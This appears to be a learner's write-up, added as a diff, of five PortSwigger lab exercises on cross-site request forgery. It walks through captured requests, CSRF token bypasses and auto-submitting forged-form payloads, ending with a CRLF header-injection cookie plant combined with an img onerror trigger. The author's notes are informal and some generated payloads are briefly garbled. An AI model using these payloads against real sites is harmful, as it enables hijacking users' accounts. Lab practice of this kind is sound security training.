@@ -1,0 +1,320 @@
+TAsk 1:
+///Lab: CSRF vulnerability with no defenses///
+
+Okay, so. first of all we need a csrf poc generator, we can find it online here:
+https://csrf-poc-generator.vercel.app/
+Or if you have burpsuite professional, there is a built in generator, u can use it as well.
+So Lets log in with wiener/peter, change the email adress to anything, and check the POST request in burpsuit and send it to repeater.
+Here is our request:
+POST /my-account/change-email HTTP/2
+Host: 0a0f00c30403926380be2b4300f2004a.web-security-academy.net
+Cookie: session=fiNlc0UyVsjNUgdMdAfrpr1nEkvC5IoS
+Content-Length: 20
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0a0f00c30403926380be2b4300f2004a.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0f00c30403926380be2b4300f2004a.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=test%40test.hu
+
+We can delete the not useful parts:
+POST /my-account/change-email HTTP/2
+Host: 0a0f00c30403926380be2b4300f2004a.web-security-academy.net
+Cookie: session=fiNlc0UyVsjNUgdMdAfrpr1nEkvC5IoS
+Content-Length: 20
+Origin: https://0a0f00c30403926380be2b4300f2004a.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+email=test%40test.hu
+
+Use copy this into the CSRF poc generator...
+And i get this:
+<html>
+  <body>
+    <form action="https://0a0f00c30403926380be2b4300f2004a.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="test%40test.hu" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+Click on Go to Exploit server, and paste this into the "body" part. Change the value to test4@test.hu and click on store. Click on View exploit, as you can see, it changed the email address.
+So it is ready, we can deliver it to the victim, just change the email address again.
+
+Task 2:
+///Lab: CSRF where token validation depends on request method///
+
+Log in with wiener/peter again, change the email, and check the request in burp:
+POST /my-account/change-email HTTP/2
+Host: 0aff00b704dbe06981a1571200ba00e8.web-security-academy.net
+Cookie: session=DCUZwODC0RckeKQMviNVTBeo6CadOGN9
+Content-Length: 58
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0aff00b704dbe06981a1571200ba00e8.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aff00b704dbe06981a1571200ba00e8.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=test%40test.hu&csrf=Am7ib1KiTyqRelhtdWw2p1spcnr8ooo7
+
+So we have a new element a csrf token, which means its not vulnerable to csrf attacks...But we can play with this token with a little bit. First try is gonna change the request method, because in GET requests csrf tokens
+does not matters
+So in repeater change the method to GET:
+GET /my-account/change-email?email=test%40test.hu&csrf=Am7ib1KiTyqRelhtdWw2p1spcnr8ooo7 HTTP/2
+Host: 0aff00b704dbe06981a1571200ba00e8.web-security-academy.net
+Cookie: session=DCUZwODC0RckeKQMviNVTBeo6CadOGN9
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0aff00b704dbe06981a1571200ba00e8.web-security-academy.net
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aff00b704dbe06981a1571200ba00e8.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+Okay. So since we dont need the csrf token we can delete it from the url:
+GET /my-account/change-email?email=test%40test.hu HTTP/2
+
+And from this request we can generate our exploit code again with the generator:
+<html>
+  <body>
+    <form action="https://0aff00b704dbe06981a1571200ba00e8.web-security-academy.net
+/my-account/change-email?email=test%40test.hu" method="GET">
+      <input type="hidden" name="Priority: u" value="0, i" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+Now go to our exploit server, and paste this into the body part. But we have to change a few parts:
+<input type="hidden" name="email"  value="test4@test.hu" /> this line must be look like this, and if you click on view exploit, it changed the email address...not change the value, store it and send it to the victim.
+And we are done.
+
+Task 3:
+///Lab: CSRF where token validation depends on token being present///
+
+Start like the 2 times before, log in, change email, send request to repeater:
+POST /my-account/change-email HTTP/2
+Host: 0af70041030a304c80bc67b000810064.web-security-academy.net
+Cookie: session=FoZyDtmFL30cYXFdilt4jUNb8G8HVyq9
+Content-Length: 58
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0af70041030a304c80bc67b000810064.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af70041030a304c80bc67b000810064.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=test%40test.hu&csrf=VRHKNtsdlmYqrJ1K074aE3bXQaXdxWdK
+
+We got Http 302. If we delete csrf completely we get still http 302...so from this request we can create our exploit:
+
+<html>
+  <body>
+    <form action="https://0af70041030a304c80bc67b000810064.web-security-academy.net
+/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="test%40test.hu" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+
+Change the value to test3@test.hu and view exploit...the email has changed, so change it again, store it, and deliver to victim.
+
+Test 4:
+///Lab: CSRF where token is not tied to user session///
+
+So we have 2 credentials. wiener/peter and carlos/montoya.
+So log in,a wiener, change your email address, and check the request:
+
+POST /my-account/change-email HTTP/2
+Host: 0a2e00f204a879f283f3c89900bd0007.web-security-academy.net
+Cookie: session=zOKMIjXzkDTUpriQgm81zD3Se2HmTtUP
+Content-Length: 58
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0a2e00f204a879f283f3c89900bd0007.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a2e00f204a879f283f3c89900bd0007.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=best%40west.hu&csrf=ZFDVLe9ueQVKu8lOXLQHLgXXkrrGgAIq
+
+Send it to repeater. Changing the method is not allowed, deleting or changing the token we will get a https 400 bad request, we get invalid token error if we aint changing the token at all!
+So this token is a one time token. BUT! if we intercept the request, copying out the token, and drop the request we will have a valid one time token which we can use.
+So turn intercept on and change the email, but catch the POST request. Copy out the token part:
+csrf=TdGsIIcTqQmBl5B07GqqFzX6K9GXtNAT  >>> this is our valid one time token
+Now from the repeater make our exploit as we did before with the generator:
+<html>
+  <body>
+    <form action="https://0a2e00f204a879f283f3c89900bd0007.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="asd3%40wasd.hu" />
+      <input type="hidden" name="csrf" value="zwhvjkuwb6rpPsjWVHftyPHrDugLgJNa" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+
+now all we have to do is change the email value, and change the token's value to our saved token like this:
+      <input type="hidden" name="email" value="asdington@wasd.hu" />
+      <input type="hidden" name="csrf" value="TdGsIIcTqQmBl5B07GqqFzX6K9GXtNAT" />
+Store it, and then deliver to the victim. If you click on visit the exploit, you have to catch another valid one time token...
+
+Test 5:
+///Lab: CSRF where token is tied to non-session cookie///
+
+Log in as wiener/peter, change the email two times, and send both request to repeater, and lets see what is changing...
+POST /my-account/change-email HTTP/2
+Host: 0a28005a04947e5081de1b7400b40069.web-security-academy.net
+Cookie: csrfKey=vdP8Ftf0Q4ILlPrDExDoiBVNKi3CLjvo; session=QE0gbeSdPBZlKF9uT4ulwBgqVS1Fc40W
+Content-Length: 56
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0a28005a04947e5081de1b7400b40069.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a28005a04947e5081de1b7400b40069.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=asd%40asd.hu&csrf=p83vMa0XJoAVhe3PyNIrejozrI5LIzmh
+
+Okay so we have a csrfkey,a session cookie, an email and a csrf...Only the email parameter changed between the 2 request and probably the csrf and csrfkey are tied together. To check this tie:
+We cant delete or modify the csrf token >>>invalid token
+So we have to check if it is working with another valid csrf token --> in incognito mode we have to login as carlos, and check his credentials, copy his csrf token and paste it as it would be ours, send the
+request and we get an invalid token, which means the csrfkey is tied to the csrf token. 
+Carlos:
+POST /my-account/change-email HTTP/2
+Host: 0a28005a04947e5081de1b7400b40069.web-security-academy.net
+Cookie: csrfKey=vdP8Ftf0Q4ILlPrDExDoiBVNKi3CLjvo; session=15BOwlN5ghfl9HkLJbxApRcV5HquBoW4
+Content-Length: 56
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0a28005a04947e5081de1b7400b40069.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a28005a04947e5081de1b7400b40069.web-security-academy.net/my-account?id=carlos
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=asd%40pos.hu&csrf=p83vMa0XJoAVhe3PyNIrejozrI5LIzmh
+As we can see carlos and wiener's csrfkey and csrf token is the same!
+But before we move on, we have to check if this two is tied to session cookie also. So to do this copy carlos's session cookie into our request send it, and we didnt get an error, so the session cookie
+is not tied to the others!
+So to deliver our exploit to the victim we need 2 things:
+1: is to inject our csrfkey cookie into the victims html header
+2: send a csrf attack with the known csrf.
+So to do the first pont do a search, and check the request in burp. we get 2 GET request one is /?search=asd and another one is /academyLabHeader
+and we have a new cookie: LastSearchTerm=asd
+Send the /?search request to repeater and modify the url like: /?search=test%0d%0aSet-Cookie:%20csrfKey=vdP8Ftf0Q4ILlPrDExDoiBVNKi3CLjvo and we got a http 200.
+
+Generate our exploit:
+<html>
+  <body>
+    <form action="https://0a28005a04947e5081de1b7400b40069.web-security-academy.net
+/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="gasd%40asd.hu" />
+      <input type="hidden" name="csrf" value="p83vMa0XJoAVhe3PyNIrejozrI5LIzmh" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+
+But instead of the document form script, we are gonna use this:
+    <img src="https://0a28005a04947e5081de1b7400b40069.web-security-academy.net/?search=asd%0d%0aSet-Cookie:%20csrfKey=vdP8Ftf0Q4ILlPrDExDoiBVNKi3CLjvo" onerror="document.forms[0].submit()">
+
+So our payload will look like this:
+<html>
+  <body>
+    <form action="https://0a28005a04947e5081de1b7400b40069.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="pwned@evil.com" />
+      <input type="hidden" name="csrf" value="p83vMa0XJoAVhe3PyNIrejozrI5LIzmh" />
+    </form>
+
+    <img src="https://0a28005a04947e5081de1b7400b40069.web-security-academy.net/?search=asd%0d%0aSet-Cookie:%20csrfKey=vdP8Ftf0Q4ILlPrDExDoiBVNKi3CLjvo%3b%20SameSite=None" onerror="document.forms[0].submit()">
+  </body>
+</html>
+
+Note: SameSite=None needs to let the browser allows us to set the cookie.
+
